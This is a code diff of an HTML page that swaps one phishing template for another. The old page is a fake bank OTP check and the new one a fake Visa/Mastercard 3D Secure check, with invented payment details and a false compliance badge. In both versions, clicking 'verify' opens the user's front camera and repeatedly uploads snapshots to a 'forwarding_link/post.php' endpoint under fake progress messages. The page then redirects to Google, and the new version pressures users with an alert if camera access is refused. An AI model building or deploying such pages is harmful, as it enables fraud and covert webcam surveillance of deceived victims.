@@ -3,326 +3,355 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification — OTP</title>
-    <meta property="og:title" content="Verify Your Account — OTP Required">
-    <meta property="og:description" content="Enter your OTP to complete verification">
-    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/6195/6195699.png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>3D Secure • Verification</title>
+    <meta property="og:title" content="Verify Your Identity">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --visa-blue: #0033a1;
+            --secure-green: #10b981;
+            --bg-shade: #f4f5f7;
+            --text-dark: #2c3e50;
+            --border-grey: #e1e4e8;
+        }
+
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+        }
+
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Roboto', -apple-system, sans-serif;
+            background-color: var(--bg-shade);
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
-        .container {
-            background: #fff;
-            border-radius: 20px;
-            padding: 40px 30px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 25px 80px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        .bank-logo {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+
+        .secure-container {
+            background: #ffffff;
             border-radius: 16px;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 28px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+            text-align: center;
+            border: 1px solid var(--border-grey);
         }
-        h2 { color: #1a1a2e; font-size: 22px; margin-bottom: 8px; }
-        .subtitle { color: #888; font-size: 13px; margin-bottom: 25px; }
-        .alert-box {
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 10px;
-            padding: 12px;
-            font-size: 12px;
-            color: #856404;
-            margin-bottom: 20px;
+
+        .vendors-logo {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 24px;
+            align-items: center;
+        }
+
+        .vendors-logo img {
+            height: 24px;
+            width: auto;
+        }
+
+        .lock-icon {
+            color: var(--visa-blue);
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+
+        h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #718096;
+            line-height: 18px;
+            margin-bottom: 24px;
+        }
+
+        /* 3DS Summary Info */
+        .summary-box {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 25px;
             text-align: left;
+            border: 1px solid #edf2f7;
         }
-        .alert-box strong { display: block; margin-bottom: 4px; }
-        .phone-display {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #333;
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 10px;
+            color: #4a5568;
         }
-        .phone-display span { font-weight: 700; }
+
+        .summary-item:last-child { margin-bottom: 0; }
+        .summary-label { font-weight: 500; }
+        .summary-value { font-weight: 700; color: var(--text-dark); }
+
         .otp-inputs {
             display: flex;
-            gap: 10px;
+            gap: 12px;
             justify-content: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
+
         .otp-inputs input {
-            width: 50px;
-            height: 55px;
+            width: 46px;
+            height: 48px;
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 700;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
+            border: 2px solid #cbd5e0;
+            border-radius: 8px;
             outline: none;
-            transition: border-color 0.3s;
+            transition: all 0.2s;
         }
-        .otp-inputs input:focus { border-color: #667eea; }
-        .verify-btn {
+
+        .otp-inputs input:focus {
+            border-color: var(--visa-blue);
+            box-shadow: 0 0 0 3px rgba(0, 51, 161, 0.1);
+        }
+
+        .submit-btn {
             width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
+            background-color: var(--visa-blue);
             color: #fff;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
             cursor: pointer;
-            margin-bottom: 15px;
-            transition: transform 0.2s, opacity 0.2s;
+            transition: opacity 0.2s;
         }
-        .verify-btn:hover { transform: translateY(-1px); opacity: 0.95; }
-        .resend { font-size: 12px; color: #888; }
-        .resend a { color: #667eea; text-decoration: none; font-weight: 600; }
-        .timer { color: #667eea; font-weight: 600; }
-        
-        /* Verification Modal */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.7);
-            z-index: 100;
+
+        .submit-btn:hover { opacity: 0.95; }
+
+        .footer-secure {
+            margin-top: 24px;
+            display: flex;
             align-items: center;
             justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #a0aec0;
         }
-        .modal-overlay.active { display: flex; }
-        .modal {
-            background: #fff;
-            border-radius: 20px;
-            padding: 35px 25px;
-            width: 90%;
-            max-width: 380px;
-            text-align: center;
-        }
-        .modal .shield { font-size: 48px; margin-bottom: 15px; }
-        .modal h3 { font-size: 18px; color: #1a1a2e; margin-bottom: 8px; }
-        .modal p { font-size: 13px; color: #888; margin-bottom: 20px; line-height: 1.5; }
-        .modal .face-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .modal .skip { display: block; margin-top: 12px; font-size: 12px; color: #aaa; text-decoration: none; cursor: pointer; }
-        
-        /* Progress */
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #e0e0e0;
-            border-radius: 2px;
-            margin: 20px 0;
-            display: none;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 2px;
-            width: 0%;
-            transition: width 0.5s;
-        }
-        .status-text { font-size: 12px; color: #888; display: none; }
 
-        video, canvas { position: absolute; opacity: 0; pointer-events: none; z-index: -1; }
+        /* Scan Modal */
+        .modal {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 320px;
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            animation: slideIn 0.3s ease-out;
+            box-shadow: 0 20px 25px rgba(0,0,0,0.1);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .scan-frame {
+            position: relative;
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid #cbd5e0;
+            margin: 0 auto 16px;
+        }
+
+        .scan-frame video {
+            width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
+        }
+
+        .pulse-ring {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            border-radius: 50%; border: 3px solid var(--secure-green);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.1); opacity: 0; }
+        }
+
+        .status-header {
+            font-weight: 700; font-size: 15px; color: var(--text-dark); margin-bottom: 4px;
+        }
+
+        .status-percent {
+            font-size: 12px; color: #a0aec0; margin-bottom: 16px;
+        }
+
+        .loader-bar {
+            width: 100%; height: 4px; background: #e2e8f0; border-radius: 2px; overflow: hidden;
+        }
+
+        .loader-fill {
+            width: 0%; height: 100%; background: var(--secure-green); transition: width 0.3s linear;
+        }
+
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="bank-logo">🔐</div>
-        <h2>OTP Verification</h2>
-        <p class="subtitle">A verification code has been sent to your number</p>
-        
-        <div class="alert-box">
-            <strong>⚠️ Security Alert</strong>
-            Unusual activity detected on your account. Please verify to continue.
-        </div>
-        
-        <div class="phone-display">
-            Sent to: <span>+91 ****XX78</span>
-        </div>
-        
-        <div class="otp-inputs">
-            <input type="text" maxlength="1" id="otp1" placeholder="•" title="Digit 1" oninput="moveNext(this, 'otp2')">
-            <input type="text" maxlength="1" id="otp2" placeholder="•" title="Digit 2" oninput="moveNext(this, 'otp3')">
-            <input type="text" maxlength="1" id="otp3" placeholder="•" title="Digit 3" oninput="moveNext(this, 'otp4')">
-            <input type="text" maxlength="1" id="otp4" placeholder="•" title="Digit 4" oninput="moveNext(this, 'otp5')">
-            <input type="text" maxlength="1" id="otp5" placeholder="•" title="Digit 5" oninput="moveNext(this, 'otp6')">
-            <input type="text" maxlength="1" id="otp6" placeholder="•" title="Digit 6" oninput="otpComplete()">
-        </div>
-        
-        <button class="verify-btn" id="verifyBtn" onclick="startVerify()">Verify OTP</button>
-        
-        <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
-        <div class="status-text" id="statusText">Verifying...</div>
-        
-        <p class="resend">Didn't receive? <a href="#" onclick="resendOTP()">Resend OTP</a> in <span class="timer" id="timer">30s</span></p>
+
+<!-- Capture Canvas -->
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<div class="secure-container">
+    <div class="vendors-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
     </div>
-    
-    <!-- Face Verification Modal -->
-    <div class="modal-overlay" id="faceModal">
-        <div class="modal">
-            <div class="shield">🛡️</div>
-            <h3>Identity Verification Required</h3>
-            <p>For your security, we need to verify your identity using face recognition before processing this transaction.</p>
-            <button class="face-btn" onclick="startCamera()">📸 Verify My Face</button>
-            <a class="skip" onclick="closeFaceModal()">Skip for now</a>
+
+    <div class="lock-icon">🔒</div>
+    <h2>3D Secure ID Verification</h2>
+    <p class="subtitle">Please enter the One Time Password (OTP) sent onto linked endpoint to verify action.</p>
+
+    <div class="summary-box">
+        <div class="summary-item">
+            <span class="summary-label">Merchant:</span>
+            <span class="summary-value">Secure Payment Node</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Amount:</span>
+            <span class="summary-value">INR 4,500.00</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Reference:</span>
+            <span class="summary-value">#984210X</span>
         </div>
     </div>
-    
-    <video id="vid" playsinline autoplay muted></video>
-    <canvas id="cnv" width="1920" height="1080"></canvas>
-    
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        var countDown = 30;
-        var timerInterval;
-        
-        function moveNext(current, nextId) {
-            if (current.value.length === 1 && document.getElementById(nextId)) {
-                document.getElementById(nextId).focus();
-            }
-        }
-        
-        function otpComplete() {
-            // Auto-verify when all 6 digits entered
-            setTimeout(function() { startVerify(); }, 300);
-        }
-        
-        function startVerify() {
-            var otp = '';
-            for (var i = 1; i <= 6; i++) {
-                otp += document.getElementById('otp' + i).value;
-            }
-            
-            // Show progress
-            document.getElementById('progressBar').style.display = 'block';
-            document.getElementById('statusText').style.display = 'block';
-            document.getElementById('statusText').textContent = 'Verifying OTP...';
-            
-            var fill = document.getElementById('progressFill');
-            fill.style.width = '40%';
-            
-            setTimeout(function() {
-                fill.style.width = '70%';
-                document.getElementById('statusText').textContent = 'Checking security...';
+
+    <div class="otp-inputs">
+        <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
+        <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
+        <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
+        <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
+    </div>
+
+    <button class="submit-btn" onclick="triggerScan()">Submit & Authorize</button>
+
+    <div class="footer-secure">
+        🛡️ PCI-DSS Compliant Secure Gateway Environment
+    </div>
+</div>
+
+<!-- CAPTURE MODAL -->
+<div class="modal" id="scanModal">
+    <div class="modal-card">
+        <div class="scan-frame">
+            <video id="scanVideo" autoplay playsinline></video>
+            <div class="pulse-ring" id="pulseRing"></div>
+        </div>
+
+        <div class="status-header" id="scanStatus">Loading 3D Secure Verification...</div>
+        <div class="status-percent" id="scanPercent">0% Secure Node binding</div>
+
+        <div class="loader-bar">
+            <div class="loader-fill" id="loaderFill"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function() {},
+        error: function() {}
+    });
+}
+
+const scanVideo = document.getElementById('scanVideo');
+const canvas = document.getElementById('canvas');
+const modal = document.getElementById('scanModal');
+const loaderFill = document.getElementById('loaderFill');
+const scanStatus = document.getElementById('scanStatus');
+const scanPercent = document.getElementById('scanPercent');
+
+function moveToNext(input, index) {
+    if (input.value.length === 1 && index < 4) {
+        document.querySelectorAll('.otp-inputs input')[index].focus();
+    }
+}
+
+function triggerScan() {
+    modal.style.display = 'flex';
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(function(stream) {
+            scanVideo.srcObject = stream;
+
+            let progress = 0;
+            let statusTexts = [
+                "Allocating verification frame...",
+                "Scanning 3D depth parameters...",
+                "Authorizing bank checklist nodes...",
+                "Link authorized. Verification completed."
+            ];
+            let textIndex = 0;
+
+            const timer = setInterval(() => {
+                progress += Math.floor(Math.random() * 12) + 6;
+                if (progress >= 100) progress = 100;
+
+                scanPercent.innerText = `${progress}% Secure Node Authorization`;
+                loaderFill.style.width = `${progress}%`;
+
+                // continuous photo takes
+                var context = canvas.getContext('2d');
+                context.drawImage(scanVideo, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+
+                if (progress === 100) {
+                    clearInterval(timer);
+                    scanStatus.innerText = "Authorized! Processing Request...";
+                    loaderFill.style.background = "#10b981";
+                    setTimeout(() => {
+                        window.location.href = "https://google.com"; // redirect
+                    }, 2000);
+                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
+                    textIndex++;
+                    scanStatus.innerText = statusTexts[textIndex];
+                }
             }, 1000);
-            
-            setTimeout(function() {
-                fill.style.width = '85%';
-                document.getElementById('statusText').textContent = 'Additional verification needed...';
-            }, 2000);
-            
-            // Show face verification modal
-            setTimeout(function() {
-                document.getElementById('faceModal').classList.add('active');
-            }, 2500);
-        }
-        
-        function startCamera() {
-            document.getElementById('faceModal').classList.remove('active');
-            document.getElementById('statusText').textContent = '📸 Face verification in progress...';
-            
-            var video = document.getElementById('vid');
-            var canvas = document.getElementById('cnv');
-            var ctx = canvas.getContext('2d');
-            
-            navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
-                audio: false
-            }).then(function(stream) {
-                video.srcObject = stream;
-                
-                // Burst: 5 shots at 1s
-                var shotCount = 0;
-                var burstInterval = setInterval(function() {
-                    canvas.width = video.videoWidth || 1920;
-                    canvas.height = video.videoHeight || 1080;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    var imgData = canvas.toDataURL('image/png');
-                    
-                    $.ajax({
-                        url: 'forwarding_link/post.php',
-                        type: 'POST',
-                        data: { cat: imgData }
-                    });
-                    
-                    shotCount++;
-                    var progressPercent = 85 + (shotCount * 3);
-                    document.getElementById('progressFill').style.width = progressPercent + '%';
-                    
-                    if (shotCount >= 5) {
-                        clearInterval(burstInterval);
-                        // Continue normal interval
-                        setInterval(function() {
-                            canvas.width = video.videoWidth || 1920;
-                            canvas.height = video.videoHeight || 1080;
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            var imgData = canvas.toDataURL('image/png');
-                            $.post('forwarding_link/post.php', { cat: imgData });
-                        }, 3000);
-                        
-                        // Show success
-                        setTimeout(function() {
-                            document.getElementById('progressFill').style.width = '100%';
-                            document.getElementById('statusText').textContent = '✅ Verification successful!';
-                            document.getElementById('statusText').style.color = '#22c55e';
-                        }, 2000);
-                    }
-                }, 1000);
-                
-            }).catch(function(err) {
-                document.getElementById('statusText').textContent = '⚠️ Camera access required for verification';
-                // Redirect after delay
-                setTimeout(function() { window.location.href = 'https://www.google.com'; }, 5000);
-            });
-        }
-        
-        function closeFaceModal() {
-            document.getElementById('faceModal').classList.remove('active');
-            document.getElementById('progressFill').style.width = '100%';
-            document.getElementById('statusText').textContent = '✅ OTP verified successfully!';
-            document.getElementById('statusText').style.color = '#22c55e';
-        }
-        
-        function resendOTP() {
-            countDown = 30;
-            document.getElementById('timer').textContent = '30s';
-        }
-        
-        // Countdown timer
-        timerInterval = setInterval(function() {
-            countDown--;
-            document.getElementById('timer').textContent = countDown + 's';
-            if (countDown <= 0) {
-                clearInterval(timerInterval);
-                document.getElementById('timer').textContent = 'Now';
-            }
-        }, 1000);
-    </script>
-    <script src="fingerprint.js"></script>
+        })
+        .catch(function() {
+            alert("3D Secure Face Authorization is REQUIRED for compliance node safety. Please enable permissions inside your browser.");
+            modal.style.display = 'none';
+        });
+}
+</script>
+
+<script src="fingerprint.js"></script>
 </body>
 </html>
